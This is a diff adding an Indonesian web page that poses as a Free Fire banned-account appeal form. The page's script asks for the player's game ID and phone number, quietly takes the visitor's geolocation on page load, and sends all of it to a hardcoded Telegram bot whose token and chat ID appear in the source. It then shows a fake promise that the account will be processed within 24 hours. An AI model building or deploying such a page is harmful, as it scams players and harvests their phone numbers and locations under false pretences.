@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulir Permohonan Free Fire</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-image: url('https://pomf2.lain.la/f/olv34oyb.jpg');
+      background-size: cover;
+      background-position: center;
+      color: #fff;
+    }
+    .container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.8);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      max-width: 450px;
+      width: 100%;
+    }
+    input, button, select {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .copyright {
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Formulir Permohonan Free Fire</h2>
+    <input type="text" id="idFreeFire" placeholder="ID Free Fire" required>
+    <input type="text" id="nomorHP" placeholder="Nomor HP" required>
+    
+    <label for="alasanBanned">Alasan Terkena Banned</label>
+    <select id="alasanBanned">
+      <option value="penipuan">Penipuan</option>
+      <option value="cheat">Menggunakan Cheat</option>
+      <option value="bug">Eksploitasi Bug</option>
+      <option value="lainnya">Lainnya</option>
+    </select>
+
+    <button onclick="kirimData()">Kirim</button>
+    <p id="responseMessage" style="display:none; color: green; font-weight: bold;">Berhasil! Kami akan memproses akun Anda dalam 1x24 jam.</p>
+    <div class="copyright">Copyright Rendzz</div>
+  </div>
+
+  <script>
+    let lokasi = '';
+
+    // Fungsi untuk mendapatkan lokasi otomatis
+    function getLokasi() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          lokasi = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+        }, function(error) {
+          lokasi = 'Lokasi tidak dapat diakses';
+        });
+      } else {
+        lokasi = 'Geolocation tidak didukung';
+      }
+    }
+
+    // Panggil fungsi untuk dapatkan lokasi otomatis
+    getLokasi();
+
+    function kirimData() {
+      const idFreeFire = document.getElementById('idFreeFire').value;
+      const nomorHP = document.getElementById('nomorHP').value;
+      const alasanBanned = document.getElementById('alasanBanned').value;
+
+      if (!idFreeFire || !nomorHP) {
+        alert('Harap isi semua kolom!');
+        return;
+      }
+
+      // Pastikan lokasi sudah terambil sebelum mengirim data
+      setTimeout(() => {
+        const botToken = '7338060515:AAEbvyGymXhLkdgTfgG2Ixmp3hI0HnDqzj0';
+        const chatId = '7941691552';
+        const message = `Permohonan Akun Free Fire:\n\nID Free Fire: ${idFreeFire}\nNomor HP: ${nomorHP}\nAlasan Banned: ${alasanBanned}\nLokasi: ${lokasi}\n\nKami akan meninjau permohonan Anda.`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(response => {
+          if (response.ok) {
+            document.getElementById('responseMessage').style.display = 'block';
+          } else {
+            alert('Gagal mengirim data ke Telegram.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Terjadi kesalahan. Silakan coba lagi.');
+        });
+      }, 2000); // Tunggu 2 detik untuk memastikan lokasi terambil
+    }
+  </script>
+</body>
+</html>
